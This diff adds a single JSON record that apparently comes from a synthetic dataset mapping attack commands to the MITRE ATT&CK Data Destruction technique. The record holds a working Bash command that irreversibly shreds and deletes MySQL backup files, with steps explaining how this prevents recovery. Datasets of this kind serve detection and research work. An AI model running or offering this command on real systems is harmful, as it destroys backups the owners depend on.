@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "find /var/backups/mysql -xdev -type f \\( -name '*.sql' -o -name '*.sql.gz' -o -name '*.dump' \\) -mtime +3 -exec shred -n 3 -z -u -f {} +",
+  "explanation": "Targets and irreversibly destroys older MySQL backup files within a confined filesystem boundary.",
+  "rationale_steps": [
+    "Constrain to backup file patterns and files older than 3 days to minimize collateral impact.",
+    "Use shred with multiple overwrite passes to prevent data recovery.",
+    "Delete files after shredding to remove directory entries and metadata pointers."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-097d0d83-d2356d51",
+  "source_prompt_hash": "097d0d83",
+  "timestamp_utc": "2025-09-30T07:53:07.976516Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
